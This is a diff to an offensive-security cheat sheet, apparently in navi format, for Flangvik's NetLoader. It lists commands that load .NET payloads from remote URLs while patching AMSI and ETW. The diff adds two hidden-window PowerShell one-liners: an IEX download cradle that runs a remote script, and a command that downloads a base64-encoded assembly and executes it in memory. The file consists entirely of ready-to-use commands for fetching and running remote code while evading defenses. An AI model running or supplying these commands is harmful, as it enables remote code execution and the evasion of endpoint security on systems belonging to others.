@@ -1,7 +1,13 @@
-% NetLoader (Flangvik)
+% .NET Assembly Loader (Flangvik)
 
-# load binary from URL with AMSI & ETW patching
+# Load a .NET binary from a remote URL with AMSI & ETW patching (uses Flangvik's NetLoader)
 Loader.exe -path <url-to-payload>
 
-# load Loader from URL and then load binary from URL
+# Download and run a loader from a remote URL, then load a payload assembly from another URL
 AssemblyLoad.exe <loader-url> -path <url-to-payload>
+
+# Execute a remote PowerShell script via download cradle and bypass AMSI (requires injection)
+powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('<url-to-script>')"
+
+# Use managed PowerShell to load and execute a base64‑encoded .NET assembly from memory
+powershell.exe -nop -w hidden -c "[Reflection.Assembly]::Load([Convert]::FromBase64String((Invoke-WebRequest '<url-to-base64-assembly>').Content)).EntryPoint.Invoke($null,$null)"
